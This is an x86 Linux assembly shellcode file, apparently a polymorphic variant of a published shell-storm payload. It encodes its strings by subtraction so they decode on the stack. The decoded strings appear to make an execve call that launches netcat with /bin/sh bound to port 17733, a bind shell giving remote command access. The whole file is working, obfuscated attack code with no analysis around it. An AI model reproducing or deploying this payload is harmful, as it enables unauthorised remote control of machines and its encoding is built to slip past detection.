;http://shell-storm.org/shellcode/files/shellcode-804.php
;Author: Anonymous
;Site: http://chaossecurity.wordpress.com/
;Polymorphic version by Henry <nc-nlvp.party>
section .text
    global _start
_start:
xor eax,eax
mov esi, 0x01010101
push 0x38383434 ;7733
sub dword [esp],esi
push 0x3271772e ;1pv-
sub dword [esp],esi
mov edx, esp
push eax
push 0x6974306f ;hs/n
sub dword [esp],esi
push 0x6a633066 ;ib/e
sub dword [esp],esi
push 0x77776d2e ;vvl-
sub dword [esp],esi
mov ecx,esp
push eax
push 0x646f3030 ;cn//
sub dword [esp],esi
push 0x6f6a6330 ;nib/
sub dword [esp],esi
mov ebx, esp
push eax
push edx
push ecx
push ebx
xor edx,edx
mov  ecx,esp
mov al,11
int 0x80
